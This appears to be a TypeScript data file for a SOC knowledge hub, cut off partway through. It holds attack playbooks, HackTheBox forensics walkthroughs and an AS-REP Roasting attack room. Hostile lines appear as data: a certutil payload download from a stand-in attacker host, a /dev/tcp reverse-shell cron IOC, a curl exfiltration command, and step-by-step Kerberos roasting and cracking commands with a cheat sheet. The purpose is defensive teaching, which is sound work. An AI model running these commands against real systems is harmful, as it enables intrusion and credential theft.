// Knowledge Hub data — Attack summaries, mitigations, response playbooks, and forensics blogs
// Curated by Ahmed Tareq for SOCMind
import forensicsMemoryImg from '@/assets/forensics-memory.jpg';
import forensicsLogsImg from '@/assets/forensics-logs.jpg';
import forensicsNetworkImg from '@/assets/forensics-network.jpg';

export interface MitreTechnique {
  id: string;
  name: string;
  url: string;
}

export interface AttackEntry {
  id: string;
  name: string;
  category: 'Initial Access' | 'Execution' | 'Persistence' | 'Credential Access' | 'Lateral Movement' | 'Exfiltration' | 'Impact';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  summary: string;
  howItWorks: string[];
  detection: string[];
  mitigation: string[];
  response: string[];
  mitre: MitreTechnique[];
  tools: string[];
}

export interface ForensicsBlog {
  id: string;
  slug: string;
  title: string;
  scenario: string;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  category: 'Memory Forensics' | 'Disk Forensics' | 'Network Forensics' | 'Log Analysis' | 'Malware Analysis';
  publishedAt: string;
  author: string;
  readingTime: number;
  labProvider: 'HackTheBox' | 'TryHackMe';
  labUrl: string;
  labName: string;
  coverImage: string;
  overview: string;
  investigationSteps: {
    title: string;
    description: string;
    commands?: string[];
    findings?: string;
  }[];
  ttps: {
    tactic: string;
    technique: string;
    techniqueId: string;
    description: string;
  }[];
  iocs: { type: string; value: string; context: string }[];
  conclusion: string;
  lessonsLearned: string[];
}

// =================== ATTACK PLAYBOOKS ===================

export const attackEntries: AttackEntry[] = [
  {
    id: 'phishing-credential-harvest',
    name: 'Phishing — Credential Harvesting',
    category: 'Initial Access',
    severity: 'High',
    summary:
      'Attackers send a crafted email with a fake login portal (Microsoft 365, Okta, banking) to steal user credentials and pivot into the corporate environment.',
    howItWorks: [
      'Threat actor registers a typo-squatted domain (e.g. micros0ft-login.com).',
      'Email is delivered with a sense of urgency (password expiry, invoice, HR notice).',
      'Victim clicks the link → fake portal mirrors the real login page.',
      'Credentials are POSTed to the attacker server and victim is redirected to the legitimate portal.',
      'Attacker uses harvested creds — often paired with MFA fatigue — to log into the real service.',
    ],
    detection: [
      'Email gateway alerts on newly registered look-alike domains.',
      'Sign-ins from impossible-travel locations or new ASNs.',
      'Multiple failed MFA push notifications followed by a successful one.',
      'User-Agent mismatch between historical and current sessions.',
    ],
    mitigation: [
      'Enforce phishing-resistant MFA (FIDO2 / WebAuthn).',
      'Enable Conditional Access with device compliance + named locations.',
      'Block newly observed domains at the proxy / DNS layer.',
      'Run quarterly phishing simulations and just-in-time training.',
      'Adopt DMARC reject + DKIM + SPF on every owned domain.',
    ],
    response: [
      'Revoke all active sessions for the impacted identity (Azure AD: Revoke-AzureADUserAllRefreshToken).',
      'Force password reset and re-enroll MFA factors.',
      'Hunt for OAuth app consent grants created in the past 30 days.',
      'Pull mailbox audit logs — look for inbox rules forwarding externally.',
      'Block sender domain at the secure email gateway and add hash to the IOC list.',
    ],
    mitre: [
      { id: 'T1566.002', name: 'Spearphishing Link', url: 'https://attack.mitre.org/techniques/T1566/002/' },
      { id: 'T1078', name: 'Valid Accounts', url: 'https://attack.mitre.org/techniques/T1078/' },
      { id: 'T1556.006', name: 'Multi-Factor Authentication', url: 'https://attack.mitre.org/techniques/T1556/006/' },
    ],
    tools: ['Evilginx2', 'Gophish', 'Modlishka'],
  },
  {
    id: 'ransomware-double-extortion',
    name: 'Ransomware — Double Extortion',
    category: 'Impact',
    severity: 'Critical',
    summary:
      'Modern ransomware crews exfiltrate data before encryption, then threaten to leak it on shame sites if the ransom is unpaid.',
    howItWorks: [
      'Initial access via VPN appliance vuln, RDP brute force, or phishing loader.',
      'Cobalt Strike / Sliver beacon deployed for persistence and C2.',
      'Active Directory enumeration with BloodHound / SharpHound.',
      'Privilege escalation to Domain Admin — typically via Kerberoasting or unpatched PrintNightmare.',
      'Data staged and exfiltrated via Rclone / MEGAsync to attacker cloud.',
      'Ransomware binary pushed via PsExec / GPO to all reachable hosts.',
    ],
    detection: [
      'Volume Shadow Copy deletion (vssadmin delete shadows /all /quiet).',
      'Mass file rename events on file servers (entropy spike).',
      'Outbound traffic to MEGA, Rclone user-agents, or unusual cloud storage.',
      'New service installations with random names across many hosts in a short window.',
    ],
    mitigation: [
      'Immutable, offline backups tested via quarterly restore drills.',
      'Network segmentation between user VLANs and crown-jewel servers.',
      'Application allow-listing on critical servers (WDAC / AppLocker).',
      'Disable SMBv1, restrict RDP to jump hosts only.',
      'Tier-0 admin model — separate accounts for DA, no email/web on those workstations.',
    ],
    response: [
      'Isolate infected hosts at the switch port — do NOT power off (preserve memory).',
      'Acquire memory + triage image of patient zero before remediation.',
      'Reset krbtgt twice (10-hour gap) to invalidate Golden Tickets.',
      'Engage legal, insurance, and law enforcement (FBI IC3 / CERT) before any ransom discussion.',
      'Rebuild from gold images — never decrypt-and-trust an infected host.',
    ],
    mitre: [
      { id: 'T1486', name: 'Data Encrypted for Impact', url: 'https://attack.mitre.org/techniques/T1486/' },
      { id: 'T1490', name: 'Inhibit System Recovery', url: 'https://attack.mitre.org/techniques/T1490/' },
      { id: 'T1567.002', name: 'Exfil to Cloud Storage', url: 'https://attack.mitre.org/techniques/T1567/002/' },
      { id: 'T1003', name: 'OS Credential Dumping', url: 'https://attack.mitre.org/techniques/T1003/' },
    ],
    tools: ['LockBit', 'BlackCat / ALPHV', 'Cobalt Strike', 'Mimikatz', 'Rclone'],
  },
  {
    id: 'lateral-movement-pth',
    name: 'Lateral Movement — Pass-the-Hash',
    category: 'Lateral Movement',
    severity: 'High',
    summary:
      'After dumping NTLM hashes from LSASS, an attacker authenticates to other Windows hosts without ever knowing the cleartext password.',
    howItWorks: [
      'Attacker compromises a workstation and elevates to local admin.',
      'Mimikatz / pypykatz dumps NTLM hashes from LSASS memory.',
      'Hashes are reused with tools like Impacket\'s wmiexec.py / smbexec.py.',
      'Attacker pivots laterally until a Domain Admin hash is found.',
      'Full domain compromise enables Golden Ticket creation.',
    ],
    detection: [
      'Event ID 4624 Logon Type 3 with NTLM authentication from a workstation.',
      'LSASS process access from non-standard binaries (Sysmon Event ID 10).',
      'Suspicious outbound SMB to many hosts in a short window.',
      'Hash reuse detected via honey-account tripwires.',
    ],
    mitigation: [
      'Enable Credential Guard (VBS) on all Windows 10/11 endpoints.',
      'Restrict local admin via LAPS — unique password per host.',
      'Block NTLM where possible; enforce Kerberos + AES.',
      'Tier-0/1/2 admin separation — never log a DA into a workstation.',
      'Protected Users group + "Account is sensitive and cannot be delegated" on privileged accounts.',
    ],
    response: [
      'Force-reset every account that logged into the compromised host.',
      'Reset krbtgt twice if any DA hash may have been exposed.',
      'Pull Sysmon + 4624/4625 logs for a full lateral-movement timeline.',
      'Re-image compromised hosts — don\'t trust AV cleanup of LSASS injection.',
    ],
    mitre: [
      { id: 'T1550.002', name: 'Pass the Hash', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { id: 'T1003.001', name: 'LSASS Memory', url: 'https://attack.mitre.org/techniques/T1003/001/' },
      { id: 'T1021.002', name: 'SMB / Admin Shares', url: 'https://attack.mitre.org/techniques/T1021/002/' },
    ],
    tools: ['Mimikatz', 'Impacket', 'CrackMapExec', 'Rubeus'],
  },
  {
    id: 'web-shell-rce',
    name: 'Web Shell via RCE',
    category: 'Execution',
    severity: 'Critical',
    summary:
      'An exposed web app vulnerability (deserialization, file upload, SSTI) is abused to drop a persistent web shell on the server.',
    howItWorks: [
      'Attacker scans for known CVEs (Log4Shell, ProxyShell, Confluence OGNL).',
      'PoC exploit returns code execution as the web service user.',
      'Small in-memory loader writes a .aspx / .jsp / .php shell to the web root.',
      'Shell provides a long-term backdoor surviving reboots.',
      'Attacker uses the shell to enumerate, dump creds, and pivot inward.',
    ],
    detection: [
      'New executable files in web-server document roots.',
      'Web server process spawning cmd.exe / bash / powershell.exe.',
      'Outbound connections originating from w3wp.exe or httpd.',
      'High entropy / obfuscated PHP/ASPX files (eval, base64_decode chains).',
    ],
    mitigation: [
      'Patch internet-facing apps within 72h of CVE disclosure.',
      'WAF with virtual-patch signatures for known web-app CVEs.',
      'Run web servers as least-privileged user, read-only doc root.',
      'File integrity monitoring on web roots (Tripwire / Wazuh FIM).',
    ],
    response: [
      'Snapshot the host (disk + memory) before any cleanup.',
      'Pull IIS / Apache / Nginx access logs for the past 90 days — look for the dropper request.',
      'Rotate all secrets stored on / accessible from the web host.',
      'Rebuild the web tier from a golden image; do not just delete the shell.',
    ],
    mitre: [
      { id: 'T1505.003', name: 'Web Shell', url: 'https://attack.mitre.org/techniques/T1505/003/' },
      { id: 'T1190', name: 'Exploit Public-Facing App', url: 'https://attack.mitre.org/techniques/T1190/' },
      { id: 'T1059', name: 'Command & Scripting Interpreter', url: 'https://attack.mitre.org/techniques/T1059/' },
    ],
    tools: ['China Chopper', 'Behinder', 'AntSword', 'Metasploit'],
  },
  {
    id: 'living-off-the-land',
    name: 'Living-off-the-Land (LOLBins)',
    category: 'Execution',
    severity: 'Medium',
    summary:
      'Attackers use signed Microsoft binaries (certutil, mshta, regsvr32, rundll32) to download payloads and evade traditional AV signatures.',
    howItWorks: [
      'Initial macro or LNK launches a LOLBin instead of a custom EXE.',
      'certutil -urlcache -split -f http://attacker/payload.bin downloads the second stage.',
      'mshta or rundll32 executes the payload, inheriting trust of the Microsoft binary.',
      'EDR signatures often whitelist these processes — alert volume is low.',
    ],
    detection: [
      'certutil with -urlcache or -decode arguments.',
      'mshta.exe with HTTP URL arguments.',
      'rundll32.exe spawning child processes from %TEMP%.',
      'PowerShell with -enc / -nop / -w hidden flags.',
    ],
    mitigation: [
      'Block known-bad LOLBin command-line patterns via ASR rules.',
      'Constrained Language Mode for PowerShell.',
      'AppLocker / WDAC scripts policy.',
      'Monitor parent-child process chains via Sysmon Event ID 1.',
    ],
    response: [
      'Capture command-line history and Sysmon events for the impacted host.',
      'Trace the originating document / email — block sender + hash.',
      'Hunt the binary hash across the entire EDR fleet.',
    ],
    mitre: [
      { id: 'T1218', name: 'Signed Binary Proxy Execution', url: 'https://attack.mitre.org/techniques/T1218/' },
      { id: 'T1059.001', name: 'PowerShell', url: 'https://attack.mitre.org/techniques/T1059/001/' },
      { id: 'T1105', name: 'Ingress Tool Transfer', url: 'https://attack.mitre.org/techniques/T1105/' },
    ],
    tools: ['LOLBAS Project', 'Atomic Red Team', 'Covenant'],
  },
  {
    id: 'dns-tunneling-exfil',
    name: 'DNS Tunneling — Data Exfiltration',
    category: 'Exfiltration',
    severity: 'High',
    summary:
      'Sensitive data is base64-encoded and embedded into DNS queries, bypassing proxies that don\'t inspect port 53.',
    howItWorks: [
      'Attacker controls authoritative DNS for a domain (evil.com).',
      'Implant chunks data into subdomain labels: <chunk1>.evil.com, <chunk2>.evil.com.',
      'Each query reaches the attacker\'s DNS server, reassembling the data.',
      'Most networks allow outbound DNS unconditionally — perfect covert channel.',
    ],
    detection: [
      'Abnormally long DNS query lengths (>50 chars in a single label).',
      'High query volume to a single second-level domain.',
      'High entropy / random-looking subdomains.',
      'TXT record queries from non-mail systems.',
    ],
    mitigation: [
      'Force all internal DNS through inspecting resolvers (e.g. Cisco Umbrella, Cloudflare Gateway).',
      'Block direct outbound UDP/53 from endpoints.',
      'DNS query logging + analytics (passive DNS).',
      'Limit DNS query size and rate per host.',
    ],
    response: [
      'Sinkhole the malicious second-level domain at the resolver.',
      'Identify all hosts that queried the domain in the last 90 days.',
      'Capture full PCAP from suspect host for offline analysis.',
      'Treat the host as compromised — rotate any secrets it could access.',
    ],
    mitre: [
      { id: 'T1071.004', name: 'Application Layer Protocol: DNS', url: 'https://attack.mitre.org/techniques/T1071/004/' },
      { id: 'T1048', name: 'Exfil Over Alt Protocol', url: 'https://attack.mitre.org/techniques/T1048/' },
    ],
    tools: ['DNSCat2', 'Iodine', 'dnsteal'],
  },
];

// =================== FORENSICS BLOGS ===================

export const forensicsBlogs: ForensicsBlog[] = [
  {
    id: 'blog-htb-perfection',
    slug: 'htb-perfection-memory-forensics',
    title: 'Investigating an Insider Data Theft — HTB "Perfection" Walkthrough',
    scenario:
      'A finance employee was suspected of leaking quarterly revenue figures to a competitor. Their workstation memory was acquired right before they left the office. Our job: prove or disprove the theft using only the memory image.',
    difficulty: 'Medium',
    category: 'Memory Forensics',
    publishedAt: '2025-04-12',
    author: 'Ahmed Tareq',
    readingTime: 9,
    labProvider: 'HackTheBox',
    labName: 'Perfection — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Perfection',
    coverImage: forensicsMemoryImg,
    overview:
      'This Sherlock simulates a real DLP investigation. We are handed a Windows 10 memory dump (.mem) and a single question: "Did the user exfiltrate the Q3 revenue spreadsheet, and if so, how?" I worked the case with Volatility 3, Bulk Extractor, and a touch of strings-fu.',
    investigationSteps: [
      {
        title: 'Step 1 — Profile identification',
        description:
          'Volatility 3 auto-profiles modern Windows builds. Started with windows.info to confirm OS build and KDBG signature.',
        commands: ['vol -f memory.mem windows.info'],
        findings: 'Windows 10 22H2, build 19045 — confirmed modern Win10 profile, no manual symbol shimming required.',
      },
      {
        title: 'Step 2 — Process tree triage',
        description:
          'pstree gives the full parent-child chain. I was hunting for cloud-storage clients, terminals, and anything spawned by Office.',
        commands: ['vol -f memory.mem windows.pstree'],
        findings:
          'Found EXCEL.EXE → cmd.exe → curl.exe — a strong red flag. Office should never spawn cmd, let alone curl, in a finance workstation.',
      },
      {
        title: 'Step 3 — Reconstructing the curl command',
        description:
          'cmdline reveals the exact arguments passed to curl, including the destination URL and the file uploaded.',
        commands: ['vol -f memory.mem windows.cmdline | grep -i curl'],
        findings:
          'curl -F "file=@C:\\Users\\jdoe\\Documents\\Q3_Revenue.xlsx" https://transfer[.]sh/upload — direct evidence of exfiltration.',
      },
      {
        title: 'Step 4 — Network artifacts',
        description:
          'netscan correlates the curl process with the actual TCP session at the time of acquisition.',
        commands: ['vol -f memory.mem windows.netscan'],
        findings:
          'Established session from PID 4812 (curl.exe) → 144.76.136.153:443 — IP belongs to transfer.sh. Timestamps line up with the cmdline.',
      },
      {
        title: 'Step 5 — Carving the spreadsheet',
        description:
          'Bulk Extractor + foremost on the raw memory pulled fragments of the Q3 spreadsheet, proving the file was open in memory at exfil time.',
        commands: ['bulk_extractor -o out memory.mem', 'foremost -t xlsx -i memory.mem -o carved/'],
        findings: 'Recovered partial XLSX OLE header containing the string "Q3 Revenue Forecast — Confidential".',
      },
    ],
    ttps: [
      {
        tactic: 'Collection',
        technique: 'Data from Local System',
        techniqueId: 'T1005',
        description: 'User accessed the Q3 spreadsheet from a local Documents folder.',
      },
      {
        tactic: 'Exfiltration',
        technique: 'Exfiltration Over Web Service',
        techniqueId: 'T1567.002',
        description: 'transfer.sh used as a free anonymous file-drop service.',
      },
      {
        tactic: 'Execution',
        technique: 'Command and Scripting Interpreter — Windows Command Shell',
        techniqueId: 'T1059.003',
        description: 'cmd.exe spawned by Excel via a malicious macro embedded in a "review" workbook.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '144.76.136.153', context: 'transfer.sh upload endpoint' },
      { type: 'Domain', value: 'transfer.sh', context: 'Exfiltration destination' },
      { type: 'Filename', value: 'Q3_Revenue.xlsx', context: 'Exfiltrated asset' },
      { type: 'Process Chain', value: 'EXCEL.EXE → cmd.exe → curl.exe', context: 'Anomalous parent-child' },
    ],
    conclusion:
      'Memory forensics gave us a complete, defensible timeline within 30 minutes — process tree, command line, network session, and a carved fragment of the stolen file. The user was confronted with the artifacts and admitted the theft. Disk forensics later corroborated the macro source.',
    lessonsLearned: [
      'Never let Office spawn shell interpreters — block via ASR rule "Block Office apps from creating child processes".',
      'Block known anonymous file-share services at the proxy.',
      'Acquire memory before disk in insider cases — volatile artifacts are the most damning.',
    ],
  },
  {
    id: 'blog-htb-brutus',
    slug: 'htb-brutus-log-analysis',
    title: 'Cracking an SSH Brute-Force Campaign — HTB "Brutus" Walkthrough',
    scenario:
      'A Linux jump host showed a suspicious spike in CPU. The SOC pulled auth.log, wtmp, btmp, and bash history. We must reconstruct the attacker\'s timeline: brute-force window, the cracked account, and any post-compromise persistence.',
    difficulty: 'Easy',
    category: 'Log Analysis',
    publishedAt: '2025-03-28',
    author: 'Ahmed Tareq',
    readingTime: 7,
    labProvider: 'HackTheBox',
    labName: 'Brutus — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Brutus',
    coverImage: forensicsLogsImg,
    overview:
      'A pure log-analysis Sherlock — no binaries, no memory, just text files. The lesson: 90% of intrusions can be reconstructed from auth.log if you know what to grep for.',
    investigationSteps: [
      {
        title: 'Step 1 — Establishing the brute-force window',
        description:
          'Counted "Failed password" entries per minute to find the attack burst.',
        commands: ['grep "Failed password" auth.log | awk \'{print $1, $2, $3}\' | uniq -c | sort -rn | head'],
        findings: '312 failed attempts between 04:13 and 04:19 UTC, all targeting user "root" from 65.2.161.68.',
      },
      {
        title: 'Step 2 — Identifying the successful login',
        description:
          'Filtered for "Accepted" entries within the same window from the same source IP.',
        commands: ['grep "Accepted" auth.log | grep "65.2.161.68"'],
        findings: 'Accepted password for root from 65.2.161.68 port 41420 — 04:19:42 UTC. The attacker burned ~6 minutes.',
      },
      {
        title: 'Step 3 — Mapping the session to wtmp',
        description:
          'last -f wtmp confirmed the live shell session and its duration.',
        commands: ['last -f wtmp -F'],
        findings: 'root pts/1 65.2.161.68 — Mar 6 04:19 still logged in (08:42 duration).',
      },
      {
        title: 'Step 4 — Persistence hunting',
        description:
          'Compared bash history, /etc/passwd, /etc/shadow, and crontab against the attack window.',
        commands: ['stat /etc/passwd /etc/shadow', 'cat /var/spool/cron/*', 'cat ~root/.bash_history'],
        findings:
          '/etc/passwd modified at 04:21:33. New user "cmnatic" added with UID 0. A reverse-shell cron entry runs every 5 minutes.',
      },
      {
        title: 'Step 5 — Eviction recommendations',
        description:
          'Documented every artifact for the IR ticket and proposed eviction steps.',
        findings:
          'Disable password auth on SSH, remove cmnatic, kill the cron, rotate root keys, and rebuild — UID 0 backdoor cannot be trusted.',
      },
    ],
    ttps: [
      {
        tactic: 'Credential Access',
        technique: 'Brute Force — Password Guessing',
        techniqueId: 'T1110.001',
        description: '312 failed root logins in 6 minutes from a single source IP.',
      },
      {
        tactic: 'Persistence',
        technique: 'Create Account — Local',
        techniqueId: 'T1136.001',
        description: 'Backdoor account "cmnatic" added to /etc/passwd with UID 0.',
      },
      {
        tactic: 'Persistence',
        technique: 'Scheduled Task/Job — Cron',
        techniqueId: 'T1053.003',
        description: 'Reverse-shell cron entry executing every 5 minutes.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '65.2.161.68', context: 'Brute-force + interactive C2' },
      { type: 'Username', value: 'cmnatic', context: 'Backdoor account UID 0' },
      { type: 'Cron', value: '*/5 * * * * /bin/bash -i >& /dev/tcp/65.2.161.68/4444 0>&1', context: 'Persistence' },
    ],
    conclusion:
      'Brutus reinforced the basics: never expose SSH password auth to the public internet, monitor auth.log for failure spikes, and treat any new UID-0 account as catastrophic. Total investigation time: 22 minutes from log handoff to written report.',
    lessonsLearned: [
      'Disable password authentication on SSH; enforce keys + MFA.',
      'Fail2Ban / CrowdSec is a free, effective brute-force mitigation.',
      'Forward auth.log to a central SIEM — do not rely on the host that was attacked.',
    ],
  },
  {
    id: 'blog-htb-tracer',
    slug: 'htb-tracer-network-forensics',
    title: 'Tracing a C2 Beacon Through PCAP — HTB "Tracer" Walkthrough',
    scenario:
      'An EDR alert flagged abnormal beacon-like traffic from a developer workstation. The SOC captured a 12-minute PCAP. Our mission: identify the C2 framework, decode the beacon, and pull any exfiltrated data.',
    difficulty: 'Hard',
    category: 'Network Forensics',
    publishedAt: '2025-02-19',
    author: 'Ahmed Tareq',
    readingTime: 11,
    labProvider: 'HackTheBox',
    labName: 'Tracer — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Tracer',
    coverImage: forensicsNetworkImg,
    overview:
      'A network-only Sherlock that mimics a real Cobalt Strike investigation. We worked the PCAP with Wireshark, Zeek, RITA, and a custom Python decoder for the obfuscated metadata.',
    investigationSteps: [
      {
        title: 'Step 1 — Top talkers and beacon detection',
        description:
          'Used RITA against the Zeek logs to find low-and-slow connections — the classic beacon footprint.',
        commands: ['zeek -r capture.pcap', 'rita import -i case zeek-logs/', 'rita show-beacons case'],
        findings:
          'Score 0.94 beacon: 10.10.10.42 → 167.71.207.89:443 — 117 connections, 60s ± 2s jitter — textbook Cobalt Strike default profile.',
      },
      {
        title: 'Step 2 — Confirming the C2 framework',
        description:
          'Pulled the JA3 / JA3S TLS fingerprints and compared against the Salesforce SSL Blacklist.',
        commands: ['tshark -r capture.pcap -Y "tls.handshake.type==1" -T fields -e tls.handshake.ja3'],
        findings: 'JA3 a0e9f5d64349fb13191bc491f9c23c79 — known Cobalt Strike Java client fingerprint.',
      },
      {
        title: 'Step 3 — Decoding the staged payload',
        description:
          'The first GET to /jquery-3.3.1.min.js returned an oversized JS file with appended encrypted shellcode (Malleable C2 jQuery profile).',
        commands: ['tshark -r capture.pcap -Y "http.request.uri==\\"/jquery-3.3.1.min.js\\"" --export-objects http,extracted/'],
        findings: 'Extracted 245KB stager — XOR key 0x69, decoded to Cobalt Strike beacon DLL (SHA256 a1b2…).',
      },
      {
        title: 'Step 4 — Recovering exfiltrated data',
        description:
          'Beacon HTTP POSTs to /submit.php carried base64-encoded metadata blocks. Wrote a 20-line Python script to decode them.',
        findings:
          'Decoded blocks revealed `whoami` output (corp\\jdoe), AD enumeration (net group "Domain Admins"), and a 4MB ZIP containing the user\'s SSH keys.',
      },
      {
        title: 'Step 5 — Building the IOC pack',
        description:
          'Documented C2 IP, JA3, URIs, XOR key, and beacon hash for distribution to the EDR + firewall teams.',
      },
    ],
    ttps: [
      {
        tactic: 'Command and Control',
        technique: 'Application Layer Protocol — Web Protocols',
        techniqueId: 'T1071.001',
        description: 'Cobalt Strike Malleable C2 over HTTPS using a jQuery profile.',
      },
      {
        tactic: 'Defense Evasion',
        technique: 'Obfuscated Files or Information',
        techniqueId: 'T1027',
        description: 'Single-byte XOR (0x69) to obscure stager and exfil blocks.',
      },
      {
        tactic: 'Discovery',
        technique: 'Domain Trust Discovery',
        techniqueId: 'T1482',
        description: 'net group "Domain Admins" enumeration via beacon.',
      },
      {
        tactic: 'Exfiltration',
        technique: 'Exfiltration Over C2 Channel',
        techniqueId: 'T1041',
        description: 'SSH keys and recon data POSTed back over the beaconing HTTPS session.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '167.71.207.89', context: 'Cobalt Strike Team Server' },
      { type: 'JA3', value: 'a0e9f5d64349fb13191bc491f9c23c79', context: 'CS Java client fingerprint' },
      { type: 'URI', value: '/jquery-3.3.1.min.js', context: 'Stager hosted on team server' },
      { type: 'URI', value: '/submit.php', context: 'Exfiltration endpoint' },
      { type: 'Crypto', value: 'XOR key 0x69', context: 'Stager + exfil obfuscation' },
    ],
    conclusion:
      'Tracer is a beautiful end-to-end network case: beacon detection (RITA) → framework attribution (JA3) → payload reversal (XOR) → exfil reconstruction (Python). Every defender should run this lab once a year — the muscle memory matters when a real beacon shows up at 3 AM.',
    lessonsLearned: [
      'Always feed PCAP into Zeek + RITA — beaconing is invisible to the human eye.',
      'JA3 fingerprints are gold for catching custom C2 frameworks.',
      'TLS inspection on egress is non-negotiable for high-value networks.',
    ],
  },
];

// =================== AD ATTACK ROOMS ===================
import adAsrepHero from '@/assets/ad-asrep-hero.jpg';
import adAsrepFlow from '@/assets/ad-asrep-flow.jpg';
import adAsrepCrack from '@/assets/ad-asrep-crack.jpg';

export interface AdAttackImage {
  src: string;
  caption: string;
}

export interface AdAttackStep {
  title: string;
  description: string;
  commands?: string[];
  image?: AdAttackImage;
  output?: string;
}

export interface AdAttackRoom {
  id: string;
  slug: string;
  name: string;
  shortName: string;
  category: 'Credential Access' | 'Privilege Escalation' | 'Lateral Movement' | 'Persistence' | 'Defense Evasion';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  publishedAt: string;
  author: string;
  readingTime: number;
  labProvider: 'HackTheBox' | 'TryHackMe';
  labName: string;
  labUrl: string;
  coverImage: string;
  summary: string;
  prerequisites: string[];
  attackFlow: string[];
  walkthrough: AdAttackStep[];
  commandsCheatsheet: { title: string; command: string; note?: string }[];
  detection: string[];
  mitigation: string[];
  remediation: string[];
  mitre: MitreTechnique[];
  tools: string[];
  references: { title: string; url: string }[];
}

export const adAttackRooms: AdAttackRoom[] = [
  {
    id: 'ad-asrep-roasting',
    slug: 'ad-asrep-roasting',
    name: 'AS-REP Roasting — Active Directory Credential Access',
    shortName: 'AS-REP Roasting',
    category: 'Credential Access',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-01',
    author: 'Ahmed Tareq',
    readingTime: 12,
    labProvider: 'HackTheBox',
    labName: 'AS-REP Roasting — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adAsrepHero,
    summary:
      'AS-REP Roasting abuses Active Directory accounts that have Kerberos pre-authentication disabled. The KDC will hand out an AS-REP message containing material encrypted with the user\'s NT hash to anyone who asks — letting an attacker crack the password offline with hashcat or john, with zero traffic to the target.',
    prerequisites: [
      'Network reachability to a domain controller on TCP/UDP 88 (Kerberos).',
      'A list of valid AD usernames (no creds required).',
      'Impacket installed (GetNPUsers.py) or Rubeus on a compromised Windows host.',
      'A wordlist (rockyou.txt) and hashcat / john for offline cracking.',
    ],
    attackFlow: [
      'Enumerate AD users (LDAP, RPC, kerbrute, or a captured user list).',
      'Send AS-REQ packets without pre-authentication for each user.',
      'KDC returns an AS-REP for any account flagged DONT_REQ_PREAUTH (UAC bit 0x400000).',
      'Extract the encrypted timestamp blob — format $krb5asrep$23$user@DOMAIN:hash.',
      'Crack offline with hashcat -m 18200 to recover the cleartext password.',
      'Authenticate as the user and pivot deeper into the domain.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Enumerate domain users',
        description:
          'Before AS-REP Roasting, we need a list of valid usernames. In the HTB room we already have low-priv credentials, so we use Impacket\'s GetADUsers.py to pull every account from the directory.',
        commands: [
          'GetADUsers.py -all -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output:
          'sAMAccountName  Email  PasswordLastSet  LastLogon\nadministrator   -      2022-09-29 ...  2024-01-12\nhtb-student     -      2022-09-29 ...  2024-01-12\nbsmith          -      2022-09-29 ...  never logged on\n... (truncated)',
      },
      {
        title: 'Step 2 — Understand the Kerberos pre-auth check',
        description:
          'A normal AS-REQ ships an encrypted timestamp (PA-ENC-TIMESTAMP) proving the client knows the password. If the account has "Do not require Kerberos preauthentication" set, the KDC skips that check and replies with an AS-REP whose encrypted portion is derived from the user\'s NT hash — a perfect offline cracking target.',
        image: { src: adAsrepFlow, caption: 'Kerberos AS-REQ vs AS-REP — pre-auth disabled = roastable.' },
      },
      {
        title: 'Step 3 — Roast all accounts at once (Linux / Impacket)',
        description:
          'GetNPUsers.py with -request asks the KDC for AS-REPs for every account that allows it. With a username list we can do this fully unauthenticated.',
        commands: [
          'GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/',
          'GetNPUsers.py -request -outputfile asrep_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output:
          '[*] Getting TGT for mmorgan\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f...$3a78f...c2\n[-] User bsmith doesn\'t have UF_DONT_REQUIRE_PREAUTH set',
      },
      {
        title: 'Step 4 — Roast from a Windows foothold (Rubeus)',
        description:
          'When we already control a domain-joined host, Rubeus does the same thing natively over Kerberos with no Impacket dependency.',
        commands: [
          'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
          'Rubeus.exe asreproast /user:mmorgan /format:hashcat',
        ],
      },
      {
        title: 'Step 5 — Crack the AS-REP hash offline',
        description:
          'Mode 18200 in hashcat targets the etype 23 (RC4-HMAC) AS-REP blob. With rockyou.txt the weak passwords fall in seconds.',
        commands: [
          'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force',
          'john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt',
        ],
        image: { src: adAsrepCrack, caption: 'hashcat -m 18200 cracking $krb5asrep$23$ blob with rockyou.' },
        output:
          '$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f…$3a78f…c2:Welcome1',
      },
      {
        title: 'Step 6 — Validate the recovered credential',
        description:
          'Confirm the cracked password actually authenticates and check what the user can reach. CrackMapExec or netexec is perfect for this sweep.',
        commands: [
          'nxc smb 10.10.10.161 -u mmorgan -p Welcome1',
          'nxc ldap 10.10.10.161 -u mmorgan -p Welcome1 --groups',
        ],
      },
      {
        title: 'Step 7 — Pivot: BloodHound from the new identity',
        description:
          'Feed the new credentials to BloodHound to find a path from mmorgan → Domain Admins. AS-REP cracks frequently land on service or stale accounts with hidden privileges.',
        commands: [
          'bloodhound-python -u mmorgan -p Welcome1 -d INLANEFREIGHT.LOCAL -ns 10.10.10.161 -c All',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'List users with PreAuth disabled (LDAP filter)', command: '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' },
      { title: 'PowerView — find roastable users', command: 'Get-DomainUser -PreauthNotRequired | select samaccountname,distinguishedname' },
      { title: 'Impacket — unauth roast with userlist', command: 'GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <DC_IP> DOMAIN/' },
      { title: 'Impacket — authed roast (auto-discover)', command: 'GetNPUsers.py -request -dc-ip <DC_IP> DOMAIN/user:pass' },
